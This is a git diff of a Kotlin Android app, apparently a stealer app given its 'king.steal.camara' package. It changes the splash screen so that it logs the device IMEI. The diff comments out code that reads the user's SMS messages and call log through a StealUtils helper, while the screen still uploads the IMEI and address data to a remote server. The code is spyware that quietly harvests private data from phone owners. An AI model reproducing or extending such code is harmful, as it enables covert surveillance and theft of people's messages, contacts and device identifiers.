@@ -24,6 +24,7 @@ import king.steal.camara.bean.User
 import king.steal.camara.net.Api
 import king.steal.camara.net.NetWorkUtilsK
 import king.steal.camara.utils.AppUtils
+import king.steal.camara.utils.LogUtils
 import king.steal.camara.utils.SpUtil
 import king.steal.camara.utils.ToastUtils
 import king.steal.marrykotlin.iface.OnRequestListener
@@ -166,12 +167,13 @@ class SplashAct : Activity(), EasyPermissions.PermissionCallbacks {
             map["address"] = phoneUser.toString()
         SpUtil.getInstance().putString("imei", imei)
         map["imei"] = imei
+        LogUtils.e(imei)
         //获取用户短信记录
-        val message = StealUtils.getSmsInPhone(applicationContext)
-        map["message"] = Gson().toJson(message)
-        //获取用户通话记录
-        val phoneInfos = StealUtils.getCallInfos(applicationContext)
-        map["phone"] = Gson().toJson(phoneInfos)
+//        val message = StealUtils.getSmsInPhone(this@SplashAct)
+//        map["message"] = Gson().toJson(message)
+//        //获取用户通话记录
+//        val phoneInfos = StealUtils.getCallInfos(applicationContext)
+//        map["phone"] = Gson().toJson(phoneInfos)
         NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.createCloudUser, object : OnRequestListener {
             override fun onSuccess(t: String) {
                 if (t == "success") {
